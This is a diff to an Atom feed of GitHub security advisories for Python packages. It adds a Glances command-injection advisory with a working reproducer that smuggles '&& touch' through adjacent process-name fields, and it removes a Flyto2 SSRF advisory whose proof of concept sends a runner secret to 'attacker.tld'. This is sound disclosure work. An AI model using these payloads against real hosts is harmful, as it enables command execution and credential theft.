@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/pip.rss</id>
     <title>Security Advisory for Python packages hosted at PyPI.org</title>
-    <updated>2026-08-17T16:18:24.024Z</updated>
+    <updated>2026-08-17T16:48:51.123Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
     <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
@@ -11,6 +11,230 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[glances] Glances has a command injection bypass of action-template sanitizer via cross-field shell-operator reconstruction]]></title>
+        <id>https://github.com/advisories/GHSA-qcpp-8x79-hhp3</id>
+        <link href="https://github.com/advisories/GHSA-qcpp-8x79-hhp3"/>
+        <updated>2026-08-17T16:36:37.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The Glances action system lets an administrator configure shell commands that run
+when a monitoring threshold is crossed. The command is a Mustache template whose
+variables are filled with runtime stat fields such as a process name, a container
+name or a filesystem mount point. Those fields are attacker-influenceable: a
+local, unprivileged user who starts a process (or a container) controls its name
+and command line. The rendered command is executed by <code>secure_popen()</code>, which
+interprets <code>&amp;&amp;</code>, <code>|</code> and <code>&gt;</code> as chaining / pipe / redirection operators.</p>
+<p><code>glances/actions.py</code> defends against this with <code>_sanitize_mustache_dict()</code>, which
+strips those operators from <strong>each individual</strong> template value before rendering.
+The sanitization is applied per field, but the operators are reconstructed
+<strong>across the boundary of two adjacent template variables</strong> after Mustache
+rendering. When an action template concatenates two unescaped variables
+(<code>{{{a}}}{{{b}}}</code> or <code>{{&amp;a}}{{&amp;b}}</code>) and the attacker makes the first value end
+with <code>&amp;</code> and the second begin with <code>&amp;</code>, the rendered command contains a real
+<code>&amp;&amp;</code>, and <code>secure_popen()</code> executes the injected command. The single-<code>&amp;</code> in each
+value passes the per-field filter untouched.</p>
+<h3 id="affected-versions">Affected versions</h3>
+<p><code>glances</code> <code>&lt;= 4.5.5</code> (verified against the published PyPI release <code>4.5.5</code>, the
+latest at the time of writing; <code>glances.__version__ == "4.5.5"</code>). The
+per-field sanitizer <code>_sanitize_mustache_dict()</code> is present and active in this
+release. Not patched in any released version.</p>
+<h3 id="privilege-required">Privilege required</h3>
+<p>Two roles are involved:</p>
+<ul>
+<li>A local, unprivileged user (or a container the attacker can name) supplies the
+attacker-controlled stat values (process/container name, mount point, etc.).
+This is the same trust boundary the action-template command-injection class
+already recognises: the attacker controls the process name, not the
+configuration.</li>
+<li>An administrator has configured an action whose command template concatenates
+two <strong>unescaped</strong> Mustache variables with no separating character
+(<code>{{{name}}}{{{cmdline}}}</code>). Unescaped Mustache (<code>{{{ }}}</code> / <code>{{&amp; }}</code>) is a
+documented Chevron feature and is the natural choice when the operator wants a
+value that contains shell-significant characters to reach the command verbatim.</li>
+</ul>
+<p>No network access to the target host is required beyond the ability to run a
+process (or start a named container) on it.</p>
+<h3 id="vulnerable-code-fileline">Vulnerable code (file:line)</h3>
+<p><code>glances/actions.py:25-46</code> — the per-field sanitizer:</p>
+<pre><code class="language-python"># glances/actions.py:25
+_SHELL_OPERATORS = ('&amp;&amp;', '|', '&gt;&gt;', '&gt;')
+
+def _sanitize_mustache_dict(mustache_dict):
+    """Return a copy of mustache_dict with shell operators replaced by spaces."""
+    if not mustache_dict:
+        return mustache_dict
+    safe = {}
+    for k, v in mustache_dict.items():
+        if isinstance(v, str):
+            for op in _SHELL_OPERATORS:
+                v = v.replace(op, ' ')          # per-field only
+            safe[k] = v
+        else:
+            safe[k] = v
+    return safe
+</code></pre>
+<p><code>glances/actions.py:100-111</code> — sanitize-then-render-then-execute:</p>
+<pre><code class="language-python"># glances/actions.py:100
+for cmd in commands:
+    if chevron_tag:
+        safe_dict = _sanitize_mustache_dict(mustache_dict)
+        cmd_full = chevron.render(cmd, safe_dict)   # concatenation happens here
+    else:
+        cmd_full = cmd
+    ret = secure_popen(cmd_full)                    # operators interpreted
+</code></pre>
+<h3 id="root-cause">Root cause</h3>
+<p><code>_sanitize_mustache_dict()</code> removes <code>&amp;&amp;</code>, <code>|</code>, <code>&gt;&gt;</code>, <code>&gt;</code> from each value in
+isolation. It does not remove a lone <code>&amp;</code>, because a single <code>&amp;</code> is not one of the
+listed operators. When two values are rendered next to each other by
+<code>chevron.render()</code>, a trailing <code>&amp;</code> from the first value and a leading <code>&amp;</code> from the
+second value join into a literal <code>&amp;&amp;</code> in <code>cmd_full</code>. <code>secure_popen()</code> then
+<code>cmd.split('&amp;&amp;')</code> and runs the second half as a separate <code>subprocess.Popen</code>
+(<code>shell=False</code>) process. The same reconstruction works for <code>&gt;</code> written as two
+adjacent <code>&gt;</code> characters split across the boundary (<code>...&gt;</code> + <code>&gt;...</code> and the
+<code>&gt;&gt;</code>/<code>&gt;</code> stripping is per field), and the sanitizer's own choice to sanitize
+before, rather than after, rendering is the defect.</p>
+<p>This is an incomplete fix of the action-template command-injection issue
+(CVE-2026-32608 / GHSA-vcv2-q258-wrg7): <code>_sanitize_mustache_dict()</code> closes the
+single-field case but not the cross-field-reconstruction case. The correct place
+to enforce the operator ban is on the fully rendered command string (or by never
+letting template-variable data introduce operators), not on the pre-render values
+one at a time.</p>
+<p>Chevron HTML-escapes <code>&amp;</code>, <code>&lt;</code>, <code>&gt;</code>, <code>"</code> inside standard double-brace <code>{{ }}</code>
+sections, so double-brace templates neutralise the <code>&amp;&amp;</code> reconstruction. The
+reconstruction is reachable specifically through <strong>unescaped</strong> variables
+(<code>{{{ }}}</code> / <code>{{&amp; }}</code>), which is why the per-field sanitizer is the sole
+remaining control on that path.</p>
+<h3 id="reachability--how-input-reaches-sink">Reachability / How input reaches sink</h3>
+<ol>
+<li>A local unprivileged user starts a process (or a container) whose <code>name</code>
+ends with <code>&amp;</code> and whose <code>cmdline</code> begins with <code>&amp; &lt;command&gt;</code> (both are stored
+verbatim in the plugin stat item).</li>
+<li>When the plugin crosses a <code>warning</code> / <code>critical</code> threshold,
+<code>glances/plugins/plugin/model.py</code> calls <code>self.actions.run</code> with the full stat
+item passed as the <code>mustache_dict</code> argument.</li>
+<li><code>GlancesActions.run</code> sanitizes each value with <code>_sanitize_mustache_dict()</code>
+(each keeps its single <code>&amp;</code>), then <code>chevron.render()</code> concatenates the two
+adjacent unescaped variables, producing a literal <code>&amp;&amp;</code> in the command string.</li>
+<li><code>secure_popen(cmd_full)</code> splits on <code>&amp;&amp;</code> and runs the attacker's segment as a
+separate <code>subprocess.Popen(shell=False)</code> process.</li>
+</ol>
+<p>The trust boundary crossed is process-name / container-name → shell operator,
+exactly the boundary the sanitizer was introduced to close.</p>
+<h3 id="reproduction-end-to-end-against-pinned-version-glances455">Reproduction (end-to-end, against pinned version <code>glances==4.5.5</code>)</h3>
+<pre><code class="language-bash"># 1. Install the latest published release into a clean venv
+python3.13 -m venv gv
+./gv/bin/pip install "glances==4.5.5"
+
+# 2. Run the reproducer, which drives the real
+#    glances.actions.GlancesActions.run() pipeline exactly as
+#    glances/plugins/plugin/model.py invokes it on an alert.
+./gv/bin/python repro.py
+</code></pre>
+<p><code>repro.py</code>:</p>
+<pre><code class="language-python">import os, sys, time
+sys.argv = ['glances']
+from glances.actions import GlancesActions
+
+MARK = "/tmp/glances_crossfield_pwned"
+NEG  = MARK + "_neg"
+for f in (MARK, NEG):
+    try: os.remove(f)
+    except FileNotFoundError: pass
+
+class Args:
+    time = 0
+ga = GlancesActions(args=Args())
+
+# A processlist stat item; a local low-privilege user controls both 'name' and
+# 'cmdline' by spawning a process (the established GHSA-vcv2 threat model).
+# 'name' ends with '&amp;', 'cmdline' begins with '&amp;'  -&gt;  '&amp;&amp;' forms across the boundary.
+item = {'name': 'evilproc&amp;', 'cmdline': '&amp; touch %s' % MARK,
+        'pid': 1337, 'cpu_percent': 99.0, 'key': 'pid'}
+
+# NEGATIVE CONTROL: the same values under an ESCAPED double-brace template are
+# neutralised by chevron HTML-escaping '&amp;' -&gt; '&amp;amp;'.
+neg_item = dict(item); neg_item['cmdline'] = '&amp; touch %s' % NEG
+ga.status.clear(); ga.start_timer._start = time.time() - 999
+ga.run("pl", "CRITICAL", ["logger p={{name}}{{cmdline}}"], repeat=True, mustache_dict=neg_item)
+time.sleep(0.3)
+print("NEGATIVE CONTROL (escaped {{name}}{{cmdline}}):",
+      "INJECTED" if os.path.exists(NEG) else "blocked (expected)")
+
+# POSITIVE: an UNESCAPED template with two adjacent variables. Per-field
+# _sanitize_mustache_dict leaves each single '&amp;'; the '&amp;&amp;' operator is
+# reconstructed after chevron.render, then split by secure_popen.
+ga.status.clear(); ga.start_timer._start = time.time() - 999
+ga.run("pl2", "CRITICAL", ["logger p={{{name}}}{{{cmdline}}}"], repeat=True, mustache_dict=item)
+time.sleep(0.5)
+print("POSITIVE (unescaped {{{name}}}{{{cmdline}}}):",
+      "INJECTED - 'touch' executed" if os.path.exists(MARK) else "blocked")
+</code></pre>
+<p>Captured output (<code>glances</code> 4.5.5, Python 3.13, x86_64 Linux):</p>
+<pre><code>NEGATIVE CONTROL (escaped {{name}}{{cmdline}}): blocked (expected)
+POSITIVE (unescaped {{{name}}}{{{cmdline}}}): INJECTED - 'touch' executed
+</code></pre>
+<p>The negative control confirms that the same attacker values under a standard
+double-brace template are blocked (chevron escapes <code>&amp;</code>). The positive case shows
+the injected <code>touch</code> executing when the template uses two adjacent unescaped
+variables: the file <code>/tmp/glances_crossfield_pwned</code> is created by the injected
+command, not by the intended <code>logger</code> action.</p>
+<h3 id="impact">Impact</h3>
+<ul>
+<li>Arbitrary command execution as the OS user running Glances (frequently root on
+monitored hosts) whenever an operator uses an unescaped, adjacent-variable
+action template and an attacker controls two neighbouring stat fields.</li>
+<li>The same reconstruction reaches <code>secure_popen()</code>'s file-redirection (<code>&gt;</code>) and
+pipe (<code>|</code>) handling, allowing arbitrary file write and output piping in
+addition to command chaining.</li>
+<li>The bypass defeats the dedicated <code>_sanitize_mustache_dict()</code> control that was
+added specifically to stop attacker-controlled stat values from injecting shell
+operators.</li>
+</ul>
+<h3 id="suggested-fix">Suggested fix</h3>
+<p>Enforce the operator ban on the <strong>rendered</strong> command string that comes from
+template-variable expansion, rather than on the pre-render values in isolation.
+One approach that mirrors the existing helper: render each variable, then reject /
+neutralise operators in the concatenated result, or strip lone <code>&amp;</code>/redirection
+characters that originate from variable data.</p>
+<pre><code class="language-python">def _sanitize_mustache_dict(mustache_dict):
+    if not mustache_dict:
+        return mustache_dict
+    safe = {}
+    for k, v in mustache_dict.items():
+        if isinstance(v, str):
+            # Neutralise every shell-significant character that secure_popen
+            # can interpret, including a lone '&amp;' that could pair with an
+            # adjacent variable to reconstruct '&amp;&amp;'.
+            for ch in ('&amp;', '|', '&gt;', '&lt;'):
+                v = v.replace(ch, ' ')
+            safe[k] = v
+        else:
+            safe[k] = v
+    return safe
+</code></pre>
+<p>Neutralising the single <code>&amp;</code> (and the single <code>&gt;</code> / <code>|</code>) in each value removes the
+cross-field reconstruction because no operator character survives on either side
+of a variable boundary. Alternatively, sanitize <code>cmd_full</code> after
+<code>chevron.render()</code>, or pass the template-derived data as <code>secure_popen(..., allow_operators=False)</code> when the command originates from stat-field substitution.</p>
+<h3 id="credit">Credit</h3>
+<p>Reported by tonghuaroot.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/nicolargo/glances/security/advisories/GHSA-qcpp-8x79-hhp3">https://github.com/nicolargo/glances/security/advisories/GHSA-qcpp-8x79-hhp3</a></li>
+<li><a href="https://github.com/nicolargo/glances/commit/9c280eae5419da680827024b60f6265956e31994">https://github.com/nicolargo/glances/commit/9c280eae5419da680827024b60f6265956e31994</a></li>
+<li><a href="https://github.com/nicolargo/glances/releases/tag/v4.5.6">https://github.com/nicolargo/glances/releases/tag/v4.5.6</a></li>
+<li><a href="https://github.com/advisories/GHSA-qcpp-8x79-hhp3">https://github.com/advisories/GHSA-qcpp-8x79-hhp3</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-qcpp-8x79-hhp3</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-08-17T16:36:37.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[mcp-contextforge-gateway] ContextForge: DNS TOCTOU race condition causes SSRF protection bypass (`/admin/gateways/test`)]]></title>
         <id>https://github.com/advisories/GHSA-9hgc-g3w5-67cm</id>
@@ -1366,63 +1590,5 @@ def _check_private_networks(self, ip_addr, hostname):
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-08-12T15:21:17.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[flyto-core] Flyto2 Core: Unauthenticated flyto-verification /run: callback_url SSRF and internal runner-secret exfiltration]]></title>
-        <id>https://github.com/advisories/GHSA-jx74-cqjv-2c67</id>
-        <link href="https://github.com/advisories/GHSA-jx74-cqjv-2c67"/>
-        <updated>2026-08-10T15:00:02.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>The standalone <code>flyto-verification</code> service exposes <code>POST /run</code> with <strong>no authentication</strong>, on all interfaces (0.0.0.0:8344 per the shipped Dockerfile). The request body's <code>callback_url</code> is used verbatim for an outbound POST that <strong>unconditionally attaches <code>X-Internal-Key: $FLYTO_RUNNER_SECRET</code></strong>. The <code>callback_url</code> bypasses the service's <code>target_allowed</code> allowlist (which only inspects <code>params.target_url</code>) and is never passed through any SSRF guard. This yields (a) unauthenticated SSRF to internal/metadata endpoints with an attacker-controlled JSON body, and (b) exfiltration of the internal runner secret to an attacker-controlled host — allowing forged authenticated callbacks to the real engine.</p>
-<h2 id="root-cause">Root Cause</h2>
-<ul>
-<li><code>src/core/verification_service.py:363-364</code> — <code>/run</code> has no <code>Depends</code>/auth dependency.</li>
-<li><code>resolve_callback_url</code> returns the client <code>callback_url</code> verbatim (<code>:315-316</code>).</li>
-<li><code>post_callback</code> attaches <code>X-Internal-Key: $FLYTO_RUNNER_SECRET</code> whenever the env var is set (<code>:327-335</code>).</li>
-<li><code>target_allowed</code> only gates <code>params.target_url</code> (<code>:259</code>), never <code>callback_url</code>. No <code>validate_url_*</code> anywhere in the file.</li>
-<li><code>Dockerfile.verification</code> CMD = <code>main('0.0.0.0', 8344)</code>; entrypoint <code>flyto-verification</code> in <code>pyproject.toml:107</code> → the shipped image binds all interfaces by default.</li>
-</ul>
-<h2 id="impact">Impact</h2>
-<p>Unauthenticated (PR:N) readable SSRF to internal/cloud-metadata with a controlled body (C:H, S:C), plus theft of <code>FLYTO_RUNNER_SECRET</code> to an attacker host → the attacker can then authenticate to the real engine callback endpoint (credential compromise, CWE-522).</p>
-<h2 id="proof-of-concept">Proof of Concept</h2>
-<p>Code-proven this session (all lines confirmed on v2.26.6):</p>
-<pre><code>POST http://&lt;verification-host&gt;:8344/run
-{"workflowYaml":"...","params":{...},"callback_url":"http://attacker.tld/collect"}
-# -&gt; service POSTs to attacker.tld with header X-Internal-Key: &lt;FLYTO_RUNNER_SECRET&gt;
-# Or callback_url=http://&lt;cloud-metadata-ip&gt;/... for internal SSRF with a controlled body.
-</code></pre>
-<h2 id="attack-chain">Attack Chain</h2>
-<ol>
-<li>Entry: unauthenticated <code>POST http://&lt;host&gt;:8344/run</code> with <code>callback_url:"http://attacker.tld/collect"</code>. Guard: auth on <code>/run</code>. Bypass proof: no <code>Depends(require_auth)</code> (verification_service.py:363-364); Dockerfile binds all interfaces on port 8344.</li>
-<li>Check: <code>target_allowed</code> scope (:259). Bypass proof: only inspects <code>params.target_url</code>; <code>callback_url</code> is never passed through <code>extract_host</code>/<code>target_allowed</code>.</li>
-<li>Check: SSRF validation on <code>callback_url</code>. Bypass proof: file has ZERO <code>validate_url</code> references.</li>
-<li>Sink: <code>post_callback</code> → <code>session.post(callback_url, json=payload, headers={"X-Internal-Key": FLYTO_RUNNER_SECRET})</code> (:330-335); header attached unconditionally when the env var is set (:327-329).</li>
-<li>Impact: (a) SSRF to the cloud metadata IP / internal with a controlled JSON body; (b) exfiltration of FLYTO_RUNNER_SECRET → replay to authenticate to the real engine callback endpoint.</li>
-</ol>
-<h2 id="bypass-evidence">Bypass Evidence</h2>
-<p><code>/run</code> has no auth dependency (grep-confirmed); <code>resolve_callback_url</code> returns the client value verbatim; <code>X-Internal-Key</code> attached unconditionally; <code>target_allowed</code> gates only <code>params.target_url</code>; no <code>validate_url_*</code> in the file; shipped Dockerfile binds all interfaces.</p>
-<h2 id="affected-versions">Affected Versions</h2>
-<p><code>&lt;= 2.26.6</code> — <code>verification_service.py</code>, <code>pyproject.toml:107</code> entrypoint, and <code>Dockerfile.verification</code> present on latest release tag.</p>
-<h2 id="suggested-fix">Suggested Fix</h2>
-<p>Add authentication to <code>/run</code>; run <code>callback_url</code> through the SSRF guard + host allowlist before attaching any internal header; do not attach <code>X-Internal-Key</code> to non-allowlisted destinations; bind the service to loopback by default.</p>
-<h2 id="credit">Credit</h2>
-<p>Vulnerability discovered by zx (Jace).</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/flytohub/flyto-core/security/advisories/GHSA-jx74-cqjv-2c67">https://github.com/flytohub/flyto-core/security/advisories/GHSA-jx74-cqjv-2c67</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-67426">https://nvd.nist.gov/vuln/detail/CVE-2026-67426</a></li>
-<li><a href="https://github.com/flytohub/flyto-core/commit/0a0a528520ec18f5a21f1ddf858a71cc1edfb6e9">https://github.com/flytohub/flyto-core/commit/0a0a528520ec18f5a21f1ddf858a71cc1edfb6e9</a></li>
-<li><a href="https://github.com/flytohub/flyto-core/releases/tag/v2.26.7">https://github.com/flytohub/flyto-core/releases/tag/v2.26.7</a></li>
-<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/flyto-core/PYSEC-2026-3571.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/flyto-core/PYSEC-2026-3571.yaml</a></li>
-<li><a href="https://github.com/advisories/GHSA-jx74-cqjv-2c67">https://github.com/advisories/GHSA-jx74-cqjv-2c67</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-jx74-cqjv-2c67</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-07-30T14:47:41.000Z</published>
     </entry>
 </feed>
